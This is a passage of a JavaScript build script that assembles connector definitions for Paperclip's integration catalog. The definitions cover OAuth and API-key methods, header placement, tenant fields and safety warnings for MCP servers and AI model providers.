const customerOAuthMethodFor = (entry) =>
  oauthMethodFor(entry, "mcp-own-oauth", entry.serverUrl, {
    label: "Use your own OAuth app",
    ownershipModes: ["customer"],
    whenToUse: `Register an OAuth app with ${entry.name}, then enter its client ID and secret.`,
    consoleLinks: { register: entry.docsUrl, docs: entry.docsUrl },
  });
const apiKeySpec = {
  bitly: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "Paste your Bitly API token",
  },
  cloudflare: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "Paste your Cloudflare API token",
  },
  ditto: {
    name: "Authorization",
    prefix: "token ",
    placeholder: "Paste your Ditto API key",
  },
  coda: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "Paste your Coda API token",
  },
  gauge: { name: "Authorization", prefix: "Bearer ", placeholder: "Paste your Gauge API key" },
  kernel: {
    name: "X-API-Key",
    prefix: null,
    placeholder: "Paste your Kernel API key",
  },
  mem0: { name: "Authorization", prefix: "Bearer ", placeholder: "Paste your Mem0 API key" },
  neon: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "napi_... or neon_project_key_...",
  },
  oreilly: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "Paste your O'Reilly API token",
  },
  pagerduty: {
    name: "Authorization",
    prefix: "Token token=",
    placeholder: "Paste your PagerDuty user API token",
  },
  // Postman's general REST API examples use X-API-Key, but its hosted MCP
  // server explicitly expects the key as an Authorization bearer token.
  postman: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "PMAK-...",
  },
  razorpay: {
    name: "Authorization",
    prefix: "Basic ",
    placeholder: "Paste the base64-encoded key ID and secret",
  },
  sanity: { name: "Authorization", prefix: "Bearer ", placeholder: "sk..." },
  similarweb: {
    name: "api-key",
    prefix: null,
    placeholder: "Paste your Similarweb API key",
  },
  stripe: { name: "Authorization", prefix: "Bearer ", placeholder: "sk_..." },
  supabase: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "sbp_...",
  },
  superagent: { name: "Authorization", prefix: "Bearer ", placeholder: "sk_live_..." },
  telem: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "tlm_...",
  },
  youcom: {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: "Paste your You.com API key",
  },
};
const apiKeyMethodFor = (
  entry,
  key = "mcp-api-key",
  serverUrl = entry.serverUrl,
  extra = {},
) => {
  const spec = apiKeySpec[entry.slug] ?? {
    name: "Authorization",
    prefix: "Bearer ",
    placeholder: `Paste your ${entry.name} API key`,
  };
  return method(
    key,
    "mcp_remote",
    "api_key",
    { serverUrl },
    entry.riskTier,
    `Use a customer-created ${entry.name} key. ${entry.prerequisite}`,
    {
      label: "Use an API key",
      whenToUse:
        "Use a restricted customer-owned key when browser sign-in is not suitable.",
      credentialFields: [
        field("authorization", `${entry.name} API key`, spec.placeholder),
      ],
      keyPlacement: {
        location: "header",
        name: spec.name,
        prefix: spec.prefix,
      },
      consoleLinks: { keys: entry.docsUrl, docs: entry.docsUrl },
      warnings: [entry.prerequisite],
      ...extra,
    },
  );
};
const specialMethodsFor = (entry) => {
  if (entry.slug === "asana") return [
    oauthMethodFor(entry, "managed", entry.serverUrl, {
      label: "Sign in with Asana",
      ownershipModes: ["platform_shared"],
      oauthStrategy: "paperclip_cloud_connector",
      connectorProfile: "asana.mcp",
      grantKinds: ["user", "agent"],
      defaults: { serverUrl: entry.serverUrl, scopesHint: ["default"] },
      guidanceMd: "Sign in to Asana with Paperclip. Asana gives this connection access to the workspaces available to your account.",
      whenToUse: "Connect your Asana account with Paperclip's app.",
      warnings: [],
    }),
    {
      ...customerOAuthMethodFor(entry),
      defaults: {
        serverUrl: entry.serverUrl,
        discoveryUrl: "https://mcp.asana.com/.well-known/oauth-protected-resource/v2",
        scopesHint: ["default"],
      },
      oauthClientSecretRequired: true,
      guidanceMd: "Create an MCP app in Asana, then add the callback URL below under OAuth. Under Manage distribution, select your workspace and save. API apps do not work with Asana MCP.",
      consoleLinks: { register: "https://app.asana.com/0/my-apps", docs: entry.docsUrl },
      warnings: [],
    },
  ];
  if (entry.slug === "mem0" || entry.slug === "honcho") return [
    apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
      guidanceMd: `Open the ${entry.name} dashboard, create an API key for the account agents should use, and paste it below.`,
      consoleLinks: { keys: entry.slug === "mem0" ? "https://app.mem0.ai/dashboard/api-keys" : "https://app.honcho.dev", docs: entry.docsUrl },
      ...(entry.slug === "honcho" ? { tenantFields: [{
        key: "workspaceId", label: "Honcho workspace", type: "text", required: true,
        placeholder: "Workspace ID", validation: { maxLength: 512 },
      }] } : {}),
    }),
  ];
  // Gauge's sign-in picks one organization during consent; an API key is bound
  // to the organization that created it and carries no user identity.
  // Ditto's sign-in runs on Auth0, which issues refresh tokens only for
  // offline_access. Its API keys use the `token` scheme, not `Bearer`, and act
  // as the user who created them.
  if (entry.slug === "ditto") {
    const warning =
      "Ditto delete tools cannot be undone, and linking text to a library component replaces each text item's developer ID. Set those actions to Ask first before agents run unattended.";
    const capabilityProfile = {
      key: "write",
      label: "Read and write",
      description: `Read style guide rules and search product text, and create, edit and translate text, components, variants and style guides. ${warning}`,
    };
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        guidanceMd:
          "Connect Ditto in the browser. The connection acts as the Ditto user who signs in. Write tools start enabled and remain governed by Paperclip's action policies.",
        warnings: [entry.prerequisite, warning],
        capabilityProfile,
      }),
      apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
        whenToUse: "Use a Ditto workspace API key when browser sign-in is not suitable.",
        guidanceMd:
          "In Ditto, open Developers → API keys, create a key for Paperclip, and paste it below.",
        consoleLinks: { keys: "https://app.dittowords.com/developers", docs: entry.docsUrl },
        warnings: [entry.prerequisite, warning],
        capabilityProfile,
      }),
    ];
  }
  if (entry.slug === "gauge") {
    const warning =
      "Gauge content tools can publish to your connected CMS, including live. Set publish actions to Ask first before agents run unattended.";
    // The access step renders the capability profile before sign-in, so the
    // publish warning is visible on the default browser path too.
    const capabilityProfile = {
      key: "write",
      label: "Read and write",
      description: `Read AI visibility, SEO and traffic data, and run content workflows. ${warning}`,
    };
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        guidanceMd:
          "Connect Gauge in the browser and choose the organization this connection may use. Write tools start enabled and remain governed by Paperclip's action policies.",
        warnings: [entry.prerequisite, warning],
        capabilityProfile,
      }),
      apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
        whenToUse: "Use a Gauge organization API key when browser sign-in is not suitable.",
        guidanceMd:
          "In Gauge, open Settings → Integrations → API Keys, generate a key for Paperclip, and paste it below.",
        warnings: [entry.prerequisite, warning],
        capabilityProfile,
      }),
    ];
  }
  // Superagent's hosted server advertises protected-resource metadata, but its
  // authorization server publishes no OAuth metadata, so organization API keys
  // are the only working credential.
  if (entry.slug === "superagent") return [
    apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
      whenToUse: "Connect with a Superagent organization API key.",
      guidanceMd: "Open Superagent Settings → API keys, create a separate key for Paperclip, and paste it below.",
      consoleLinks: { keys: "https://www.superagent.sh/app/settings#api-keys", docs: entry.docsUrl },
    }),
  ];
  if (entry.slug === "zep") return [oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
    grantKinds: ["user"],
    defaults: { serverUrl: entry.serverUrl, scopesHint: ["graph:read", "graph:write"] },
    guidanceMd: "Sign in with the work identity configured for your Zep project's Memory MCP server. Zep restricts access to that identity's memory and authorized shared graphs.",
    consoleLinks: { settings: "https://app.getzep.com", docs: entry.docsUrl },
  })];
  if (entry.slug === "supermemory") return [oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
    grantKinds: ["user"],
    defaults: { serverUrl: entry.serverUrl, scopesHint: ["openid", "profile", "email", "offline_access"] },
    guidanceMd: "Sign in to Supermemory, then choose a workspace, read or write access, and optional tags. Use a separate space for unrelated work.",
  })];
  if (entry.slug === "fireflies")
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        defaults: { serverUrl: entry.serverUrl, scopesHint: ["email", "profile"] },
        guidanceMd: "Sign in to Fireflies to use meeting transcripts, summaries, and action items. Configure optional summary-ready webhooks separately in a routine's Triggers tab.",
      }),
      apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
        whenToUse: "Use your Fireflies API key instead of browser sign-in.",
        guidanceMd: "Open Fireflies Settings → Developer Settings, copy your API key, and paste it below. This key accesses your meeting data; routine webhooks use a separate signing secret.",
        consoleLinks: {
          keys: "https://app.fireflies.ai/settings",
          docs: entry.docsUrl,
        },
      }),
    ];
  // Atlassian's /authv2 rollout only issues GA-tool-compatible tokens when the
  // authorization request includes this reviewed protected-resource scope set.
  // Omitting scope currently yields agent-interface scopes that its own Jira
  // tools reject with HTTP 401. Users can still deselect write toolsets in the
  // provider consent screen; never replace this allowlist with live discovery.
  if (entry.slug === "jira")
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        defaults: {
          serverUrl: entry.serverUrl,
          scopesHint: [
            "read:me",
            "read:account",
            "offline_access",
            "email",
            "read:jira-work",
            "write:jira-work",
            "search:confluence",
            "read:confluence-user",
            "read:page:confluence",
            "write:page:confluence",
            "read:comment:confluence",
            "write:comment:confluence",
            "read:space:confluence",
            "read:hierarchical-content:confluence",
            "write:component:compass",
            "read:component:compass",
            "read:scorecard:compass",
            "write:scorecard:compass",
            "read:event:compass",
            "read:metric:compass",
            "read:all:twg",
            "write:all:twg",
          ],
        },
      }),
    ];
  if (entry.slug === "hugging-face")
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        defaults: { serverUrl: entry.serverUrl, scopesHint: ["read-mcp"] },
      }),
    ];
  if (entry.slug === "xero")
    return [
      oauthMethodFor(entry, "mcp-own-oauth", entry.serverUrl, {
        label: "Use your own OAuth app",
        ownershipModes: ["customer"],
        whenToUse: `Register an OAuth app with ${entry.name}, then enter its client ID and secret.`,
        consoleLinks: { register: entry.docsUrl, docs: entry.docsUrl },
        defaults: {
          serverUrl: entry.serverUrl,
          scopesHint: [
            "openid",
            "profile",
            "email",
            "offline_access",
            "accounting.settings",
            "accounting.invoices.read",
            "accounting.reports.aged.read",
            "accounting.reports.balancesheet.read",
            "accounting.reports.profitandloss.read",
          ],
        },
      }),
    ];
  if (entry.slug === "clickhouse")
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        tenantFields: [
          {
            key: "serviceId",
            label: "ClickHouse Cloud service ID",
            type: "text",
            required: true,
            placeholder: "11e1031f-9a13-4cac-9bc7-d4ec9286ec17",
            helperMd:
              "Copy the service ID from ClickStack → Team Settings → API & Agents.",
            transport: { location: "header", name: "x-service-id" },
          },
        ],
        requiredResourceFilters: ["service"],
      }),
    ];
  if (entry.slug === "planetscale")
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        label: "Database access",
        tenantFields: [
          {
            key: "project",
            label: "Project or database",
            type: "text",
            advanced: true,
            placeholder: "Optional project or database name",
            helperMd:
              "Records the intended database boundary; final access is selected during PlanetScale authorization.",
          },
          {
            key: "branch",
            label: "Branch",
            type: "text",
            advanced: true,
            placeholder: "Optional branch name",
            helperMd:
              "Records the intended branch boundary; final access is selected during PlanetScale authorization.",
          },
        ],
        requiredResourceFilters: ["organization", "database", "branch"],
      }),
      oauthMethodFor(
        entry,
        "mcp-insights-only",
        "https://mcp.pscale.dev/mcp/planetscale-insights-only",
        {
          label: "Insights only",
          whenToUse:
            "Use query insights and schema recommendations without query execution tools.",
          requiredResourceFilters: ["organization", "database", "branch"],
        },
      ),
    ];
  if (entry.slug === "postman")
    return [
      oauthMethodFor(
        entry,
        "mcp-oauth-minimal",
        "https://mcp.postman.com/minimal",
        {
          label: "US · Browser sign-in",
          capabilityProfile: {
            key: "minimal",
            label: "Minimal",
            description:
              "Essential workspace, collection, and environment tools with the smallest tool catalog.",
          },
        },
      ),
      oauthMethodFor(entry, "mcp-oauth-code", "https://mcp.postman.com/code", {
        label: "US · Browser sign-in",
        capabilityProfile: {
          key: "code",
          label: "Code",
          description: "Tools for generating client code from API definitions.",
        },
      }),
      oauthMethodFor(entry, "mcp-oauth-full", "https://mcp.postman.com/mcp", {
        label: "US · Browser sign-in",
        capabilityProfile: {
          key: "write",
          label: "Full",
          description:
            "All Postman API tools, including write-capable collaboration and advanced features.",
        },
      }),
      apiKeyMethodFor(
        entry,
        "mcp-eu-key-minimal",
        "https://mcp.eu.postman.com/minimal",
        {
          label: "EU · API key",
          capabilityProfile: {
            key: "minimal",
            label: "Minimal",
            description:
              "Essential workspace, collection, and environment tools with the smallest tool catalog.",
          },
        },
      ),
      apiKeyMethodFor(
        entry,
        "mcp-eu-key-code",
        "https://mcp.eu.postman.com/code",
        {
          label: "EU · API key",
          capabilityProfile: {
            key: "code",
            label: "Code",
            description:
              "Tools for generating client code from API definitions.",
          },
        },
      ),
      apiKeyMethodFor(
        entry,
        "mcp-eu-key-full",
        "https://mcp.eu.postman.com/mcp",
        {
          label: "EU · API key",
          capabilityProfile: {
            key: "write",
            label: "Full",
            description:
              "All Postman API tools, including write-capable collaboration and advanced features.",
          },
        },
      ),
    ];
  if (entry.slug === "pagerduty")
    return [
      apiKeyMethodFor(
        entry,
        "mcp-api-key-us",
        "https://mcp.pagerduty.com/mcp",
        { label: "US service region" },
      ),
      apiKeyMethodFor(
        entry,
        "mcp-api-key-eu",
        "https://mcp.eu.pagerduty.com/mcp",
        { label: "EU service region" },
      ),
    ];
  if (entry.slug === "supabase") {
    const tenantFields = [
      {
        key: "projectRef",
        label: "Project reference",
        type: "text",
        required: true,
        placeholder: "abcdefghijklmnopqrst",
        helperMd: "Scope the connection to one development project.",
        transport: { location: "query", name: "project_ref" },
      },
      {
        key: "readOnly",
        label: "Read-only mode",
        type: "checkbox",
        defaultValue: false,
        helperMd:
          "Enable this to prevent the connection from changing the database.",
        transport: { location: "query", name: "read_only", format: "boolean" },
      },
      {
        key: "features",
        label: "Feature groups",
        type: "textarea",
        advanced: true,
        placeholder: "database,docs",
        helperMd: "Optional comma-separated feature groups.",
        transport: { location: "query", name: "features", format: "csv" },
      },
    ];
    const warning =
      "Do not connect production data unless you have reviewed Supabase's MCP security guidance.";
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        guidanceMd:
          "Connect Supabase in the browser and scope the connection to one development project. Write tools start enabled and remain governed by Paperclip's action policies.",
        tenantFields,
        warnings: [entry.prerequisite, warning],
        requiredResourceFilters: ["project"],
      }),
      apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
        guidanceMd:
          "Use a customer-created Supabase key scoped to one development project. Write tools start enabled and remain governed by Paperclip's action policies.",
        tenantFields,
        warnings: [entry.prerequisite, warning],
        requiredResourceFilters: ["project"],
      }),
    ];
  }
  if (entry.slug === "neon") {
    // Neon's hosted server narrows itself with documented query options:
    // `projectId` pins one project and `readonly=true` limits SQL to SELECT
    // and schema inspection. Its repeatable `category` filter has no
    // comma-joined form, so catalog narrowing stays with per-action policies.
    const tenantFields = [
      {
        key: "projectId",
        label: "Pin to project ID",
        type: "text",
        advanced: true,
        placeholder: "Optional Neon project ID",
        helperMd:
          "Optional. Restrict this connection to one project. Copy the project ID from Neon Console → Project settings → General.",
        validation: { pattern: "^[a-z0-9-]+$", maxLength: 64 },
        transport: { location: "query", name: "projectId" },
      },
      {
        key: "readOnly",
        label: "Read-only mode",
        type: "checkbox",
        defaultValue: false,
        helperMd:
          "Enable this to limit SQL to SELECT queries and schema inspection.",
        transport: {
          location: "query",
          name: "readonly",
          format: "boolean",
          omitFalse: true,
        },
      },
    ];
    const warning =
      "Neon recommends its hosted server for development and testing. Review write and destructive actions before execution.";
    return [
      oauthMethodFor(entry, "mcp-oauth", entry.serverUrl, {
        guidanceMd:
          "Connect Neon in the browser. Open Advanced to pin one project or enable read-only mode. Write tools start enabled and remain governed by Paperclip's action policies.",
        tenantFields,
        warnings: [entry.prerequisite, warning],
        requiredResourceFilters: ["project"],
      }),
      apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
        guidanceMd:
          "Use a customer-created Neon API key. Prefer a project-scoped key for one development project; personal and organization keys reach every project they can access. Write tools start enabled and remain governed by Paperclip's action policies.",
        consoleLinks: {
          keys: "https://console.neon.tech/app/settings/api-keys",
          docs: entry.docsUrl,
        },
        tenantFields,
        warnings: [entry.prerequisite, warning],
        requiredResourceFilters: ["project"],
      }),
    ];
  }
  if (entry.slug === "telem") {
    // Telem's hosted server takes an API key only. The optional settings are
    // per-connection request headers that the server reads; each one is left
    // out of the request when it is empty, so an unset field keeps the
    // server's default (auto routing off, default tier, all providers).
    const providerList = (key, label, header, helperMd) => ({
      key,
      label,
      type: "textarea",
      advanced: true,
      placeholder: "Optional comma-separated provider names",
      helperMd,
      validation: { pattern: "^[A-Za-z0-9_.-]+(,[A-Za-z0-9_.-]+)*$", maxLength: 500 },
      transport: { location: "header", name: header, format: "csv" },
    });
    const tenantFields = [
      {
        key: "autoRouting",
        label: "Auto routing",
        type: "select",
        advanced: true,
        options: [
          { value: "off", label: "Off" },
          { value: "accuracy", label: "Accuracy" },
        ],
        helperMd:
          "Optional. Accuracy lets Telem choose the search providers for each query. Off, or no selection, keeps auto routing off.",
        transport: { location: "header", name: "X-Telem-Auto-Routing" },
      },
      {
        key: "tier",
        label: "Tier",
        type: "select",
        advanced: true,
        options: [
          { value: "minimalist", label: "Minimalist" },
          { value: "default", label: "Default" },
          { value: "extended", label: "Extended" },
          { value: "max", label: "Max" },
        ],
        helperMd:
          "Optional. Sets how much search work Telem does for each query. No selection uses the Default tier.",
        transport: { location: "header", name: "X-Telem-Tier" },
      },
      providerList(
        "providersInclude",
        "Providers to include",
        "X-Telem-Providers-Include",
        "Optional. Telem searches only these providers. Leave it empty to allow all providers.",
      ),
      providerList(
        "providersExclude",
        "Providers to exclude",
        "X-Telem-Providers-Exclude",
        "Optional. Telem does not search these providers.",
      ),
    ];
    return [
      apiKeyMethodFor(entry, "mcp-api-key", entry.serverUrl, {
        guidanceMd:
          "Create an API key in the Telem console at app.telem.ai. Paste the key below. Open Advanced to set auto routing, the tier, or the providers to include or exclude.",
        whenToUse: "Connect with a Telem API key.",
        consoleLinks: { keys: "https://app.telem.ai", docs: entry.docsUrl },
        tenantFields,
      }),
    ];
  }
  if (entry.slug === "youcom") {
    // You.com also serves a documented keyless profile at ?profile=free with a
    // reduced read-only tool set. That is a real user choice: try web search
    // with no account, or connect the full authenticated server.
    return [
      oauthMethodFor(entry),
      apiKeyMethodFor(entry),
      method(
        "mcp-free",
        "mcp_remote",
        "none",
        { serverUrl: "https://api.you.com/mcp?profile=free" },
        entry.riskTier,
        "Use the keyless free profile. You.com limits the free profile to a reduced read-only tool set.",
        {
          label: "Use the free profile",
          whenToUse:
            "Connect without an account for limited, rate-capped web search.",
          consoleLinks: { docs: entry.docsUrl },
          warnings: [
            "The free profile is keyless and exposes a reduced read-only tool set with You.com rate limits.",
          ],
        },
      ),
    ];
  }
  return null;
};

// Cognee Cloud publishes a local MCP client, not a hosted remote MCP endpoint.
// This approved, pinned template uses the ordinary vault and stdio gateway.
apps.push({
  schemaVersion: 1, slug: "cognee", name: "Cognee",
  description: "Build and recall shared graph memory from documents and conversations.",
  categories: ["ai"], branding: brandingFor("cognee"),
  urlPatterns: ["https://*.aws.cognee.ai/*"],
  docsUrl: "https://docs.cognee.ai/cognee-cloud/connections/cloud-mcp",
  setupPrerequisite: {
    title: "Cognee Cloud and a local runtime",
    description: "Use your Cognee Cloud tenant API URL and key. Paperclip's runtime host needs uv installed to run the official Cognee MCP client. Public deployments require a trusted MCP runtime host.",
    actionLabel: "Open Cognee API keys", actionUrl: "https://platform.cognee.ai/api-keys",
  },
  methods: [method("cloud-local", "local_stdio", "api_key", { templateKey: "paperclip.cognee-cloud" }, "S3",
    "Copy the API Base URL and create an API key on Cognee's API Keys page. Use a Cloud workspace with an active subscription. Paperclip uses its bundled Cloud client; no extra runtime installation is required.", {
      label: "Connect Cognee Cloud", whenToUse: "Connect your Cloud tenant through the official Cognee MCP client.",
      credentialFields: [
        { key: "COGNEE_BASE_URL", label: "API Base URL", type: "text", required: true, secret: false, placeholder: "https://your-tenant.aws.cognee.ai", validation: { pattern: "^https://[a-zA-Z0-9-]+\\.aws\\.cognee\\.ai/?$", maxLength: 255 }, helperMd: "Copy API Base URL from Cognee's API Keys page." },
        { ...field("COGNEE_API_KEY", "Cognee API key", "Paste your Cognee API key"), helperMd: "Create a key in Cognee → API Keys. The key is shown once." },
      ],
      keyPlacement: { location: "env", name: "COGNEE_API_KEY" },
      consoleLinks: { keys: "https://platform.cognee.ai/api-keys", docs: "https://docs.cognee.ai/cognee-cloud/connections/cloud-mcp" },
    })],
});

for (const entry of researchManifest.entries) {
  const existing = apps.find((app) => app.slug === entry.slug);
  if (entry.status === "blocked") {
    if (existing)
      existing.availability = { available: false, reason: entry.prerequisite };
    continue;
  }
  if (existing) {
    existing.docsUrl = entry.docsUrl;
    existing.redirectConstraints = existing.methods.some(
      (entryMethod) => entryMethod.auth === "oauth",
    )
      ? "https-or-loopback-http"
      : existing.redirectConstraints;
    if (entry.slug !== "zapier")
      for (const entryMethod of existing.methods)
        if (
          entryMethod.transport === "mcp_remote" &&
          entryMethod.defaults?.serverUrl
        )
          entryMethod.defaults.serverUrl = entry.serverUrl;
    continue;
  }
  let methods = specialMethodsFor(entry);
  if (!methods) {
    if (entry.authMode === "public")
      methods = [method("public-mcp", "mcp_remote", "none", { serverUrl: entry.serverUrl }, entry.riskTier,
        "Connect the provider's public MCP server without an account credential.", { label: "Connect public tools" })];
    else if (entry.authMode === "customer_oauth")
      methods = [customerOAuthMethodFor(entry)];
    else if (entry.authMode === "api_key") methods = [apiKeyMethodFor(entry)];
    else {
      methods = [oauthMethodFor(entry)];
      if (entry.authMode === "dcr_or_api_key")
        methods.push(apiKeyMethodFor(entry));
    }
  }
  const warnings = [];
  if (["coda", "mixpanel"].includes(entry.slug))
    warnings.push(
      "This provider's hosted MCP server is currently beta or preview.",
    );
  if (["brex", "razorpay", "stripe"].includes(entry.slug))
    warnings.push(
      "Financial or destructive actions must be explicitly approved before execution.",
    );
  apps.push({
    schemaVersion: 1,
    slug: entry.slug,
    name: entry.name,
    description: ({ neon: "Manage Postgres projects and branches, run SQL, and inspect schemas in Neon.", ditto: "Search and reuse approved product copy, follow your style guide, and edit and translate text.", gauge: "Track how AI answers mention your brand, research keywords and traffic, and run content workflows.", superagent: "Review security findings, start red-team reports, and score content and packages before agents trust them.", mem0: "Remember preferences, conversations, events, and agent state.", zep: "Retrieve temporal graph memory and authorized business context.", supermemory: "Search and save shared memories, documents, and profiles.", honcho: "Remember conversations and retrieve context about peers.", telem: "Search the web and read pages across many search providers with one API key." })[entry.slug] ?? (entry.slug === "fireflies"
      ? "Search meeting transcripts, read summaries and action items, and connect meeting-ready routines."
      : `Connect ${entry.name}'s provider-hosted MCP server.`),
    categories: [categoryBySlug[entry.slug] ?? "other"],
    featured: entry.slug === "jira",
    branding: brandingFor(entry.slug),
    urlPatterns: [`${new URL(entry.serverUrl).origin}/*`],
    docsUrl: entry.docsUrl,
    redirectConstraints: methods.some(
      (entryMethod) => entryMethod.auth === "oauth",
    )
      ? "https-or-loopback-http"
      : undefined,
    methods: methods.map((entryMethod) =>
      warnings.length > 0
        ? {
            ...entryMethod,
            warnings: [...(entryMethod.warnings ?? []), ...warnings],
          }
        : entryMethod,
    ),
  });
}
// Google Workspace definitions are reviewed, first-class app entries rather
// than rows synthesized from the generic connection corpus. Keep legacy product
// definitions for saved connections alongside the combined Workspace entry.
const reviewedGoogleSlugs = [
  "google-workspace",
  "gmail",
  "google-drive",
  "google-docs",
  "google-sheets",
  "google-slides",
  "google-calendar",
  "google-chat",
  "google-people",
  "google-workspace-search",

];
for (const slug of reviewedGoogleSlugs) {
  const existingIndex = apps.findIndex((app) => app.slug === slug);
  if (existingIndex >= 0) apps.splice(existingIndex, 1);
  apps.push(
    JSON.parse(fs.readFileSync(path.join(out, `${slug}.json`), "utf8")),
  );
}
const parseTableRow = (line) =>
  line
    .slice(1, -1)
    .split("|")
    .map((cell) => cell.trim());
const parseCapture = (fileName) => {
  const markdown = fs.readFileSync(path.join(corpus, fileName), "utf8");
  const stateMatches = [...markdown.matchAll(/^## State: (.+)$/gm)];
  if (stateMatches.length === 0)
    throw new Error(`${fileName}: no captured states`);
  return stateMatches.map((match, index) => {
    const body = markdown.slice(
      match.index + match[0].length,
      stateMatches[index + 1]?.index ?? markdown.length,
    );
    const inputsBlock =
      body.match(/### Inputs\n([\s\S]*?)(?=\n### |$)/)?.[1] ?? "";
    const inputRows = inputsBlock
      .split("\n")
      .filter((line) => line.startsWith("|"))
      .slice(2)
      .map(parseTableRow);
    const fields = inputRows.map(
      ([label, tagType, required, placeholder, prefilledValue, checked]) => ({
        label,
        tagType,
        required: required.toLowerCase() === "yes",
        placeholder: placeholder || null,
        prefilledValue: prefilledValue || null,
        checked: checked.toLowerCase() === "true",
      }),
    );
    const linksBlock =
      body.match(/### Links\n([\s\S]*?)(?=\n## |$)/)?.[1] ?? "";
    const links = linksBlock
      .split("\n")
      .map((line) => line.match(/^(.+?) → (https?:\/\/\S+)$/))
      .filter(Boolean)
      .map((link) => ({ label: link[1].trim(), href: link[2] }));
    return { label: match[1].trim(), fields, links };
  });
};
const inferState = (slug, state) => {
  const label = state.label.toLowerCase();
  const fieldText = state.fields
    .map((field) => field.label.toLowerCase())
    .join(" ");
  const transport =
    slug === "oauth-generic" ||
    slug === "api-key-generic" ||
    label.includes("path: api") ||
    label.includes("api key form")
      ? "rest_api"
      : "mcp_remote";
  const auth =
    slug === "oauth-generic" ||
    label.includes("oauth") ||
    fieldText.includes("client id")
      ? "oauth"
      : slug === "api-key-generic" ||
          label.includes("api key") ||
          fieldText.includes("api key")
        ? "api_key"
        : null;
  const ownershipModes = [];
  // A "Managed" state in Vercel describes credential custody, not ownership of
  // a Paperclip connection. Keep those concepts separate: importing this review
  // evidence must never silently turn an operator-owned connector into
  // `platform_shared`.
  const externalCredentialCustody =
    label.includes("managed") && !label.includes("no managed")
      ? "vercel_connect"
      : null;
  if (
    label.includes("your own credentials") ||
    label.includes("manual") ||
    label.includes("api key")
  )
    ownershipModes.push("customer");
  if (slug === "oauth-generic" && !label.includes("manually"))
    ownershipModes.push("dcr");
  return {
    label: state.label,
    transport,
    auth,
    ownershipModes: [...new Set(ownershipModes)],
    externalCredentialCustody,
    fieldCount: state.fields.length,
    linkCount: state.links.length,
  };
};
// Runtime credentials share the provider catalog, but never expose tool actions.
const aiCatalogEntries = [
  { slug: "anthropic", name: "Claude", provider: "anthropic", subscription: true, envKey: "ANTHROPIC_API_KEY" },
  { slug: "openai", name: "OpenAI", provider: "openai", subscription: true, envKey: "OPENAI_API_KEY", url: "https://api.openai.com/*" },
  { slug: "openrouter", name: "OpenRouter", provider: "openrouter", envKey: "OPENROUTER_API_KEY", url: "https://openrouter.ai/api/*" },
  { slug: "xai", name: "Grok", provider: "xai", subscription: true, envKey: "XAI_API_KEY", url: "https://api.x.ai/*" },
  { slug: "google", name: "Google Gemini", provider: "google", envKey: "GEMINI_API_KEY", url: "https://generativelanguage.googleapis.com/*" },
  { slug: "bedrock", name: "Amazon Bedrock", provider: "anthropic", envKey: "AWS_BEARER_TOKEN_BEDROCK", description: "Use Claude through Amazon Bedrock with a Bedrock API key and AWS region." },
  { slug: "responses-api", name: "Responses API", provider: "openai", envKey: "OPENAI_API_KEY", description: "Connect any compatible harness to an OpenAI Responses-compatible provider or gateway, including Emissary." },
  { slug: "messages-api", name: "Messages API", provider: "anthropic", envKey: "ANTHROPIC_API_KEY", description: "Connect any compatible harness to an Anthropic Messages-compatible provider or gateway." },
  { slug: "chat-completions-api", name: "Chat Completions API", provider: "openai", envKey: "OPENAI_API_KEY", description: "Connect any compatible harness to a Chat Completions-compatible provider or gateway." },
  { slug: "local", name: "Local endpoint", provider: "openai", envKey: "OPENAI_API_KEY", description: "Use a local model server in the agent’s execution environment." },
];
for (const { slug, name, provider, subscription, envKey, url, description } of aiCatalogEntries) {
  let app = apps.find(a => a.slug === slug);
  if (!app) {
    app = { schemaVersion: 1, slug, name, description: description ?? `Connect ${name} accounts for your agents.`, categories: ["ai"], branding: brandingFor(slug), urlPatterns: url ? [url] : [], methods: [] };
    apps.push(app);
  }
  app.tags = [...new Set([...(app.tags ?? []), "model-provider"])];
  const methods = (subscription ? ["subscription", "api_key"] : ["api_key"]).map(authMethod => ({
    key: `ai-${authMethod}`, label: authMethod === "subscription" ? `${name} subscription` : `${name} API key`,
    purpose: "ai", transport: "runtime_auth", auth: authMethod === "subscription" ? "oauth" : "api_key",
    ai: { provider, method: authMethod }, grantKinds: ["user", "organization"], ownershipModes: ["customer"],
    whenToUse: description ?? "Authenticate an agent with this account.",
    guidanceMd: "Use your personal account or an explicitly shared company account.", riskTier: "S3",
    ...(authMethod === "api_key" ? { credentialFields: [field("apiKey", "API key", "Enter API key")], keyPlacement: { location: "env", name: envKey } } : {}),
  }));
  // Legacy REST entries have no tool execution adapter. Only offer the supported
  // AI account flow; saved REST connections remain removable through Connections.
  app.methods = [...methods, ...app.methods.filter(method => method.transport !== "rest_api")];
}
// Reviewed provider-specific source data stays separate from generated output.
// Apply it after legacy/research inputs, then run the same branding, permission,
// instruction-template and validation pipeline as every other definition.
const overridesDirectory = path.join(root, "scripts/app-definition-overrides");
if (fs.existsSync(overridesDirectory)) {
  for (const fileName of fs.readdirSync(overridesDirectory).filter(name => name.endsWith(".json")).sort()) {
